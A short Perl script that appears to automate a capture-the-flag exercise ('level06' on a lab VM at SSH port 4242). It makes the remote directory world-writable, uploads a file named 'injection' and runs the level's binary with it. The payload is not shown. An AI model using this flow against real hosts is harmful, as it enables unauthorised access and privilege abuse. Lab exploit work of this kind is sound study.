#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level06";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$chmod = "chmod 777 .";
print $red, $chmod, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$chmod'");

$scp2 = "scp -q -P 4242 ./injection $user\@$ip:~";
print $green, $scp2, $reset, "\n";
system($scp2);

$tool = "./$user injection";
print $red, $tool, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$tool'");
